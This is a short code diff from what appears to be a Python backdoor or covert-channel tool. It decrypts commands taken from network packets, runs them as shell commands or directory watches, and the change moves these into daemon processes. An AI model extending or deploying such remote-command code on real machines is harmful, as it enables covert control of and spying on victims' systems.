@@ -12,6 +12,7 @@ from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
 from random import randint
 from Crypto.Cipher import AES
+from multiprocessing import Process
 CONN_IPS = collections.defaultdict(list)
 CMDS = collections.defaultdict(list)
 MONITOR = 0
@@ -137,9 +138,15 @@ def read_inst(packet, command):
 	command = decrypt_val(command)
 	cmd = command.split(' ', 1)
 	if(cmd[0] == "run"):
-		run_cmd(packet, cmd[1])
+		cmdProc = Process(target=run_cmd, args=(packet, cmd[1],))
+		cmdProc.daemon = True
+		cmdProc.start()
+		# run_cmd(packet, cmd[1])
 	elif(cmd[0] == "watch"):
-		watch_dir(packet, cmd[1])
+		fileProc = Process(target=watch_dir, args=(packet, cmd[1],))
+		fileProc.daemon = True
+		fileProc.start()
+		# watch_dir(packet, cmd[1])
 	else:
 		print(cmd)
 
